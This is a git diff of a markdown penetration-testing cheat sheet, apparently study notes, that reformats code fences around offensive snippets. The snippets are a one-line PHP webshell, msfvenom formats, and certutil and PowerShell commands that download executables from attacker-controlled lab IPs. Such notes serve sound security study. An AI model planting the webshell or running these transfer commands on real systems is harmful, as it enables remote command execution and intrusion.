@@ -631,29 +631,34 @@ gcc -o suid suid.c
 # Tips and Tricks
 
 #### Windows Searching:
-``` Dir C:\Windows /S *cmd*
-``` Dir C:\Windows\System32 /Q | find “BOB”
+``` Dir C:\Windows /S *cmd*```
+``` Dir C:\Windows\System32 /Q | find “BOB”```
 
-``` msfvenom formats
-``` exe, elf, c
-``` python, perl, asp, JavaScript, war
-``` js_le, (javascript, little endian)
+msfvenom formats
+``` exe, elf, c```
+``` python, perl, asp, JavaScript, war```
+``` js_le, (javascript, little endian)```
 Webshells
-``` /usr/share/webshells/
-``` Pikachu.gif.php
-``` <? php echo system($_REQUEST['cmd']); ?>
+``` /usr/share/webshells/```
+``` Pikachu.gif.php```
+``` <? php echo system($_REQUEST['cmd']); ?>```
+
 Reverse-shell One-liners
+
 #### http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - Try first, then last, then 2,3,4...
 - whereis netcat | which nc
 
 # Windows Transfer
-``` certutil.exe -urlcache -split -f "http://10.10.14.19/accesschk.exe" achk.exe
-``` Smbserver.py leshare . → Copy \\10.10.14.19\leshare\accesschk.exe
-``` https://www.abatchy.com/2017/03/powershell-download-file-one-liners
-``` (new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe",
-"C:\lec\accesschk.exe")
-``` Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"
+``` certutil.exe -urlcache -split -f "http://10.10.14.19/accesschk.exe" achk.exe```
+``` Smbserver.py leshare . → Copy \\10.10.14.19\leshare\accesschk.exe```
+
+https://www.abatchy.com/2017/03/powershell-download-file-one-liners
+
+``` (new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe","C:\lec\accesschk.exe")```
+
+``` Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"```
+
 # Windows Tricks
 #### SMB Server
 - smbserver.py leshare /var/www/html
